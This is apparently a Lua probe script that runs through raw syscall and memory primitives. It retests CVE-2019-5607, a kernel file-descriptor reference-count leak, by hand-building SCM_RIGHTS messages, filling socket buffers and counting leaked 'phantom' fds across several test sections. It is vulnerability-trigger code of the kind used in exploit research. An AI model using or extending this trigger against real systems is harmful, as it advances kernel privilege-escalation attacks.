-- CRASH_CLASS: MODERATE
-- PROBE 527b: CVE-2019-5607 refcount leak — compact retest
--
-- 527a output truncated after section B. This covers B/C/D/F/G compactly.
-- Core question: do FAILED SCM_RIGHTS sends leak fget() references?
-- If phantom fds > successful sends after drain, refcount leak exists.

print("=== PROBE 527b: GHOST REFCOUNT V2 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function zero_buf(addr, sz)
    for j = 0, sz - 1, 4 do safe_wd(addr + j, 0) end
end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        safe_wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end

local sc20          = make_syscall(20)
local sc_socketpair = make_syscall(135)
local sc_sendmsg    = make_syscall(28)
local sc_recvmsg    = make_syscall(27)
local sc_close      = make_syscall(6)
local sc_open       = make_syscall(5)
local sc_fstat      = make_syscall(189)
local sc_setsockopt = make_syscall(105)
local sc_write      = make_syscall(4)
local sc_ioctl      = make_syscall(54)

local AF_UNIX     = 1
local SOCK_STREAM = 1
local SOCK_DGRAM  = 2
local SOL_SOCKET  = 0xFFFF
local SCM_RIGHTS  = 1
local SO_SNDBUF   = 0x1001
local SO_RCVBUF   = 0x1002
local MSG_DONTWAIT = 0x80
local FIONBIO     = 0x8004667E

local pid = to_num(sc20())
print("pid=" .. pid)

-- === Helpers ===

local rng_path = memory.alloc(16)
write_string(rng_path, "/dev/rng\0")

local function make_pair(sock_type)
    local sv = memory.alloc(16); zero_buf(sv, 16)
    local ok, ret = pcall(function()
        return sc_socketpair(uint64(AF_UNIX), uint64(sock_type), uint64(0), uint64(to_num(sv)))
    end)
    if ok and to_num(ret) == 0 then
        return safe_rd(sv), safe_rd(sv + 4)
    end
    return nil, nil
end

local function open_rng()
    local ok, ret = pcall(function()
        return sc_open(uint64(to_num(rng_path)), uint64(0), uint64(0))
    end)
    return ok and to_num(ret) or -1
end

local function set_nonblock(fd)
    local one = memory.alloc(4); safe_wd(one, 1)
    pcall(function() sc_ioctl(uint64(fd), uint64(FIONBIO), uint64(to_num(one))) end)
end

local function fd_valid(fd)
    if not fd or fd < 0 then return false end
    local stat = memory.alloc(256); zero_buf(stat, 256)
    local ok, ret = pcall(function() return sc_fstat(uint64(fd), uint64(to_num(stat))) end)
    return ok and to_num(ret) == 0
end

local function send_fd(sender_fd, fd_to_pass, flags)
    local msghdr = memory.alloc(0x40); zero_buf(msghdr, 0x40)
    local iov    = memory.alloc(0x10); zero_buf(iov, 0x10)
    local data   = memory.alloc(8);    safe_wd(data, 0x46)
    local cmsg   = memory.alloc(0x40); zero_buf(cmsg, 0x40)

    safe_wq(iov, uint64(to_num(data)))
    safe_wq(iov + 8, uint64(1))

    safe_wd(cmsg + 0, 20)          -- cmsg_len = CMSG_ALIGN(16) + 4
    safe_wd(cmsg + 4, SOL_SOCKET)
    safe_wd(cmsg + 8, SCM_RIGHTS)
    safe_wd(cmsg + 16, fd_to_pass)

    safe_wq(msghdr + 0x10, uint64(to_num(iov)))
    safe_wq(msghdr + 0x18, uint64(1))
    safe_wq(msghdr + 0x20, uint64(to_num(cmsg)))
    safe_wd(msghdr + 0x28, 24)     -- cmsg_space

    local ok, ret = pcall(function()
        return sc_sendmsg(uint64(sender_fd), uint64(to_num(msghdr)), uint64(flags or 0))
    end)
    return ok and to_num(ret) or -999
end

local function recv_fd(receiver_fd, flags)
    local msghdr = memory.alloc(0x40); zero_buf(msghdr, 0x40)
    local iov    = memory.alloc(0x10); zero_buf(iov, 0x10)
    local data   = memory.alloc(8)
    local cmsg   = memory.alloc(64);   zero_buf(cmsg, 64)

    safe_wq(iov, uint64(to_num(data)))
    safe_wq(iov + 8, uint64(4))

    safe_wq(msghdr + 0x10, uint64(to_num(iov)))
    safe_wq(msghdr + 0x18, uint64(1))
    safe_wq(msghdr + 0x20, uint64(to_num(cmsg)))
    safe_wd(msghdr + 0x28, 64)

    local ok, ret = pcall(function()
        return sc_recvmsg(uint64(receiver_fd), uint64(to_num(msghdr)), uint64(flags or 0))
    end)
    local rv = ok and to_num(ret) or -999
    local controllen = safe_rd(msghdr + 0x28) or 0
    local got_fd = nil
    if controllen > 0 and (safe_rd(cmsg + 8) or 0) == SCM_RIGHTS then
        got_fd = safe_rd(cmsg + 16)
    end
    return rv, got_fd
end

local function minimize_bufs(fd0, fd1)
    local ob = memory.alloc(4)
    safe_wd(ob, 1)
    pcall(function() sc_setsockopt(uint64(fd0), uint64(SOL_SOCKET), uint64(SO_SNDBUF), uint64(to_num(ob)), uint64(4)) end)
    safe_wd(ob, 1)
    pcall(function() sc_setsockopt(uint64(fd1), uint64(SOL_SOCKET), uint64(SO_RCVBUF), uint64(to_num(ob)), uint64(4)) end)
end

local function fill_buffer(fd)
    local fill = memory.alloc(4096)
    for j = 0, 4095, 4 do safe_wd(fill + j, 0x41414141) end
    local total = 0
    for i = 1, 500 do
        local ok, ret = pcall(function()
            return sc_write(uint64(fd), uint64(to_num(fill)), uint64(2048))
        end)
        if ok and to_num(ret) > 0 then total = total + to_num(ret)
        else break end
    end
    return total
end

local function drain_fds(fd)
    set_nonblock(fd)
    local data_msgs, fd_msgs = 0, 0
    for i = 1, 2000 do
        local rr, got_fd = recv_fd(fd, MSG_DONTWAIT)
        if rr < 0 then break end
        if got_fd and got_fd >= 0 then
            fd_msgs = fd_msgs + 1
            pcall(function() sc_close(uint64(got_fd)) end)
        else
            data_msgs = data_msgs + 1
        end
    end
    return data_msgs, fd_msgs
end

local function close_fd(fd)
    if fd and fd >= 0 then pcall(function() sc_close(uint64(fd)) end) end
end

-- ============================================================
-- [B] DGRAM fill-and-fail (50 iterations)
-- ============================================================
print("[B] DGRAM fill-and-fail (50 iter)")
do
    local fd0, fd1 = make_pair(SOCK_DGRAM)
    local tfd = open_rng()
    if fd0 and fd1 and tfd >= 0 then
        set_nonblock(fd0)
        minimize_bufs(fd0, fd1)
        local filled = fill_buffer(fd0)
        local fails, successes = 0, 0
        for i = 1, 50 do
            local sr = send_fd(fd0, tfd, MSG_DONTWAIT)
            if sr > 0 then successes = successes + 1
            else fails = fails + 1 end
        end
        local dm, fm = drain_fds(fd1)
        print(string.format("  filled=%dB fail=%d ok=%d drain_data=%d drain_fd=%d",
            filled, fails, successes, dm, fm))
        if fm > successes then
            print(string.format("  *** LEAK: %d phantom fds ***", fm - successes))
        else
            print("  clean (fd_msgs=" .. fm .. " == ok=" .. successes .. ")")
        end
        close_fd(tfd)
    end
    close_fd(fd0); close_fd(fd1)
end

-- ============================================================
-- [C] Close sender with inflight SCM_RIGHTS
-- ============================================================
print("")
print("[C] Inflight discard")
do
    local fd0, fd1 = make_pair(SOCK_STREAM)
    local tfd = open_rng()
    if fd0 and fd1 and tfd >= 0 then
        local sr = send_fd(fd0, tfd, 0)
        close_fd(fd0); fd0 = nil
        local rr, got_fd = recv_fd(fd1)
        local valid = got_fd and fd_valid(got_fd)
        print(string.format("  send=%d close_sender recv=%d got_fd=%s valid=%s",
            sr, rr, tostring(got_fd), tostring(valid)))
        if got_fd then close_fd(got_fd) end
        close_fd(tfd)
    end
    close_fd(fd0); close_fd(fd1)
end

-- ============================================================
-- [D] Send same fd 10x, close original, receive all
-- ============================================================
print("")
print("[D] Double-send x10")
do
    local fd0, fd1 = make_pair(SOCK_STREAM)
    local tfd = open_rng()
    if fd0 and fd1 and tfd >= 0 then
        local sent = 0
        for i = 1, 10 do
            if send_fd(fd0, tfd, 0) > 0 then sent = sent + 1 end
        end
        close_fd(tfd)
        local recvd, all_valid = 0, true
        for i = 1, 10 do
            local rr, got_fd = recv_fd(fd1)
            if got_fd then
                recvd = recvd + 1
                if not fd_valid(got_fd) then all_valid = false end
                close_fd(got_fd)
            end
        end
        print(string.format("  sent=%d recvd=%d all_valid=%s", sent, recvd, tostring(all_valid)))
        if recvd ~= sent then
            print(string.format("  *** MISMATCH: delta=%d ***", recvd - sent))
        else
            print("  clean accounting")
        end
    end
    close_fd(fd0); close_fd(fd1)
end

-- ============================================================
-- [F] High-volume DGRAM (1000 iterations)
-- ============================================================
print("")
print("[F] DGRAM high-volume (1000 iter)")
do
    local fd0, fd1 = make_pair(SOCK_DGRAM)
    local tfd = open_rng()
    if fd0 and fd1 and tfd >= 0 then
        set_nonblock(fd0)
        minimize_bufs(fd0, fd1)
        local filled = fill_buffer(fd0)
        local fails, successes, errors = 0, 0, 0
        for i = 1, 1000 do
            local sr = send_fd(fd0, tfd, MSG_DONTWAIT)
            if sr > 0 then successes = successes + 1
            elseif sr == -999 then errors = errors + 1
            else fails = fails + 1 end
        end
        local valid_after = fd_valid(tfd)
        local dm, fm = drain_fds(fd1)
        print(string.format("  filled=%dB fail=%d ok=%d err=%d fd_valid=%s",
            filled, fails, successes, errors, tostring(valid_after)))
        print(string.format("  drain: data=%d fds=%d (expected=%d)", dm, fm, successes))
        if fm > successes then
            print(string.format("  *** LEAK: %d phantom fds ***", fm - successes))
        elseif fm < successes then
            print(string.format("  LOST: %d fds discarded", successes - fm))
        else
            print("  clean accounting")
        end
        close_fd(tfd)
    end
    close_fd(fd0); close_fd(fd1)
end

-- ============================================================
-- [G] SOCK_STREAM fill-and-fail (200 iterations)
-- ============================================================
print("")
print("[G] SOCK_STREAM fill-and-fail (200 iter)")
do
    local fd0, fd1 = make_pair(SOCK_STREAM)
    local tfd = open_rng()
    if fd0 and fd1 and tfd >= 0 then
        set_nonblock(fd0)
        set_nonblock(fd1)
        minimize_bufs(fd0, fd1)
        local filled = fill_buffer(fd0)
        local fails, successes = 0, 0
        for i = 1, 200 do
            local sr = send_fd(fd0, tfd, MSG_DONTWAIT)
            if sr > 0 then successes = successes + 1
            else fails = fails + 1 end
        end
        local dm, fm = drain_fds(fd1)
        print(string.format("  filled=%dB fail=%d ok=%d", filled, fails, successes))
        print(string.format("  drain: data=%d fds=%d (expected=%d)", dm, fm, successes))
        if fm ~= successes then
            print(string.format("  *** MISMATCH: delta=%d ***", fm - successes))
        else
            print("  clean accounting")
        end
        close_fd(tfd)
    end
    close_fd(fd0); close_fd(fd1)
end

-- ============================================================
print("")
local pid2 = to_num(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " CHANGED"))
print("=== 527b DONE ===")
